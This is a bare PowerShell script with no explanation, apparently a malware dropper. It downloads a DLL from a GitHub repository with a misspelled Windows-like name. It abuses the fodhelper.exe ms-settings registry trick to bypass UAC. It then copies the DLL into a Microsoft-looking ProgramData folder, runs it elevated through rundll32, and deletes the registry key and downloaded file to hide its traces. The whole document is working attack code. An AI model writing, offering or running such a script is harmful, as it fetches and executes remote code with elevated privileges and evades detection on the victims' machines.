$cdn     = "https://github.com/KronoRDP/System.Service-Windonws/raw/refs/heads/main/DismCore.dll"
$tmp     = "$env:TEMP\stage.dll"
$dir     = "C:\ProgramData\Microsoft\Windows\Caches"
$dst     = "$dir\DismCore.dll"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    (New-Object Net.WebClient).DownloadFile($cdn, $tmp)
} catch { exit 1 }

$elev = "cmd.exe /c mkdir `"$dir`" 2>nul & copy /y `"$tmp`" `"$dst`" & rundll32.exe `"$dst`",DllRegisterServer"

$reg = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
New-Item $reg -Force | Out-Null
Set-ItemProperty $reg -Name "(Default)" -Value $elev -Force
New-ItemProperty $reg -Name "DelegateExecute" -Value "" -Force | Out-Null

Start-Process "C:\Windows\System32\fodhelper.exe"

Start-Sleep -Seconds 8
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $tmp -Force -ErrorAction SilentlyContinue